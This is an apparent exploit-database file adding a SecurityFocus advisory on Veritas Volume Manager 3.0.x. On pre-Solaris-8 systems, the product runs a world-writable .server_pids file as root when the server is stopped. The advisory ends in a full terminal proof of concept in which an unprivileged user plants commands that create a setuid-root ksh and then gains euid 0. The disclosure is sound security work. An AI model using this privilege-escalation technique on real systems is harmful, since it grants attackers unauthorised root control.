@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/1356/info
+
+
+A vulnerability exists in the Volume Manager product, versions 3.0.x, from Veritas Software. Volume Manager is a popular disk management package. Volume Manager running on Solaris platforms prior to Solaris 8 are vulnerable.
+
+Upon startup, the /etc/rc2.d/S96vmsa-server script is executed. It never explicitly sets a umask, and therefore inherits the parent umask, which is unset. When the server starts, it creates a file named .server_pids, in the directory /var/opt/vmsa/logs. As no umask is set, its permissions are set to 666. (user, group and world readable and writable).
+
+The control script used to control various aspects of the Storage Administrator server will, upon getting a request to stop the server, execute the contents of the .server_pids file. As any user can alter the contents of the .server_pids file, a would be attacker can execute arbitrary commands by placing them in the .server_pids file, and waiting for an administrator to call the stop routine of the control script (/opt/VRTSvmsa/bin/vmsa_server). This will cause the code in the .server_pids file to be executed as the user running the script. In most cases this will be root.
+
+This vulnerability requires that the administrator run the vmsa_server script with the stop command. It will not be invoked upon a shutdown.
+
+Solaris 8 machines are not susceptible to this vulnerability, as the umask of the system is set to 022 prior to the execution of the /etc/rc2.d/S96vmsa-server script. As a result, the .server_pids file is created non-world and non-group writable, and the contents of this file cannot be altered. 
+
+foo@bar> id
+uid=500(foo) gid=25(programmers)
+foo@bar> ls -alt /var/opt/vmsa/logs/.server_pids
+-rw-rw-rw- 1 root root 27 Jun 8 16:06 /var/opt/vmsa/logs/.server_pids
+foo@bar> cat >> /var/opt/vmsa/logs/.server_pids
+cp /bin/ksh /var/tmp; chmod 4755 /var/tmp/ksh
+^D
+foo@bar> cat /var/opt/vmsa/logs/.server_pids
+kill 328
+kill 329
+kill 337
+cp /bin/ksh /var/tmp; chmod 4755 /var/tmp/ksh
+foo@bar>
+
+# wait for root to stop the server manually
+
+root@bar> /opt/VRTSvmsa/bin/vmsa_server -k
+Stopping VERITAS VM Storage Administrator Server
+root@bar> ls -alt /var/tmp
+total 406
+drwxrwxrwt 2 sys sys 512 Jun 8 17:46 .
+-rwsr-xr-x 1 root other 192764 Jun 8 17:46 ksh
+-rw------- 1 root root 387 Jun 8 17:46 wsconAAArqayVa:0.0
+drwxr-xr-x 26 root sys 512 Jun 8 09:51 ..
+
+# as an unprivileged user, run the suid-root shell we just created...
+
+foo@bar> /var/tmp/ksh
+# id
+uid=500(foo) gid=25(programmers) euid=0(root)
+# 
